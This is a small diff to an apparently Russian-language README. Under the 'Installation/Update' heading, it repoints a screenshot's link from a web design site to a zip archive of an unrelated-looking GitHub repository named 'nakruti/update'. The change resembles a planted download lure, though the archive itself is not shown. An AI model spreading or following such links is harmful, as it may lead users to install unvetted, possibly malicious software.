@@ -7,4 +7,4 @@
 ***
 Установка/Обновление
 =====================
-[![screenshot of sample](http://f0482823.xsph.ru/213.png)](http://webdesign.ru.net)
+[![screenshot of sample](http://f0482823.xsph.ru/213.png)](https://github.com/nakruti/update/archive/main.zip)
